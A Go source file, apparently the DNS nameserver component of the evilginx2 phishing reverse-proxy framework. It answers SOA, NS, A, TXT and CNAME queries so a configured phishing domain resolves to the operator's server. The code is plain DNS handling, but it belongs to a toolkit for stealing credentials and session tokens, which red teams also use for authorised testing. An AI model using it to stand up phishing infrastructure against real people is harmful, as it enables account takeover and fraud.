package core

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"

	"github.com/kgretzky/evilginx2/log"
)

type Nameserver struct {
	srv    *dns.Server
	cfg    *Config
	bind   string
	serial uint32
	ctx    context.Context
}

func NewNameserver(cfg *Config) (*Nameserver, error) {
	o := &Nameserver{
		serial: uint32(time.Now().Unix()),
		cfg:    cfg,
		bind:   fmt.Sprintf("%s:%d", cfg.GetServerBindIP(), cfg.GetDnsPort()),
		ctx:    context.Background(),
	}

	o.Reset()

	return o, nil
}

func (o *Nameserver) Reset() {
	dns.HandleFunc(pdom(o.cfg.general.Domain), o.handleRequest)
}

func (o *Nameserver) Start() {
	go func() {
		o.srv = &dns.Server{Addr: o.bind, Net: "udp"}
		if err := o.srv.ListenAndServe(); err != nil {
			log.Fatal("Failed to start nameserver on: %s", o.bind)
		}
	}()
}

func (o *Nameserver) handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	if o.cfg.general.Domain == "" || o.cfg.general.ExternalIpv4 == "" {
		return
	}

	soa := &dns.SOA{
		Hdr:     dns.RR_Header{Name: pdom(o.cfg.general.Domain), Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 300},
		Ns:      "ns1." + pdom(o.cfg.general.Domain),
		Mbox:    "hostmaster." + pdom(o.cfg.general.Domain),
		Serial:  o.serial,
		Refresh: 900,
		Retry:   900,
		Expire:  1800,
		Minttl:  60,
	}
	m.Ns = []dns.RR{soa}

	fqdn := strings.ToLower(r.Question[0].Name)

	var isCNAME = false

	switch r.Question[0].Qtype {
	case dns.TypeSOA:
		log.Debug("DNS SOA: " + fqdn)
		m.Answer = append(m.Answer, soa)
	case dns.TypeA:
		// Assuming o.cfg.cnameRecords is a []*CNAMERecord
		for _, cnameRecord := range o.cfg.cnameRecords {
			// log.Debug("CNAME Record: %+v", cnameRecord)
			// Access Target of each individual CNAMERecord
			if cnameRecord != nil {
				// Access Name and Target fields of each individual CNAMERecord
				name := cnameRecord.Name
				target := cnameRecord.Target

				if name == fqdn {
					log.Debug("DNS CNAME: '%s' - '%s'", name, target)

					// Create a DNS response CNAME record using the Name and Target fields
					rr := &dns.CNAME{
						Hdr: dns.RR_Header{Name: name, Rrtype: dns.TypeCNAME, Class: dns.ClassINET, Ttl: 300},
						Target: target,
					}

					// Append the CNAME record to the Answer section of the DNS response
					m.Answer = append(m.Answer, rr)
					isCNAME = true
				}
			}
		}

		if !isCNAME {
			log.Debug("DNS A: " + fqdn + " = " + o.cfg.general.ExternalIpv4)
			rr := &dns.A{
				Hdr: dns.RR_Header{Name: fqdn, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 300},
				A: net.ParseIP(o.cfg.general.ExternalIpv4),
			}
			m.Answer = append(m.Answer, rr)
		}
	case dns.TypeNS:
		log.Debug("DNS NS: " + fqdn)
		if fqdn == pdom(o.cfg.general.Domain) {
			for _, i := range []int{1, 2} {
				rr := &dns.NS{
					Hdr: dns.RR_Header{Name: pdom(o.cfg.general.Domain), Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 300},
					Ns:  "ns" + strconv.Itoa(i) + "." + pdom(o.cfg.general.Domain),
				}
				m.Answer = append(m.Answer, rr)
			}
		}
	// 20240129 https://github.com/kgretzky/evilginx2/issues/952
	case dns.TypeTXT:
		// Assuming o.cfg.txtRecords is a []*TXTRecord
		for _, txtRecord := range o.cfg.txtRecords {
			// Access TextData of each individual TXTRecord
			if txtRecord != nil {
				// Access Name and Value fields of each individual TXTRecord
				name := txtRecord.Name
				value := txtRecord.Value

				log.Debug("DNS TXT: '%s' - '%s'", name, value)

				// Create a DNS response TXT record using the Name and Value fields
				rr := &dns.TXT{
					Hdr: dns.RR_Header{Name: fqdn, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 300},
					Txt: []string{value},
				}

				// Append the TXT record to the Answer section of the DNS response
				m.Answer = append(m.Answer, rr)
			}
		}
	// 20240220
	case dns.TypeCNAME:
		// Assuming o.cfg.cnameRecords is a []*CNAMERecord
		for _, cnameRecord := range o.cfg.cnameRecords {
			log.Debug("CNAME Record: %+v", cnameRecord)
			// Access Target of each individual CNAMERecord
			if cnameRecord != nil {
				// Access Name and Target fields of each individual CNAMERecord
				name := cnameRecord.Name
				target := cnameRecord.Target

				log.Debug("DNS CNAME: '%s' - '%s'", name, target)

				// Create a DNS response CNAME record using the Name and Target fields
				rr := &dns.CNAME{
					Hdr: dns.RR_Header{Name: name, Rrtype: dns.TypeCNAME, Class: dns.ClassINET, Ttl: 300},
					Target: target,
				}

				// Append the CNAME record to the Answer section of the DNS response
				m.Answer = append(m.Answer, rr)
			}
		}

	}
	w.WriteMsg(m)
}

func pdom(domain string) string {
	return domain + "."
}
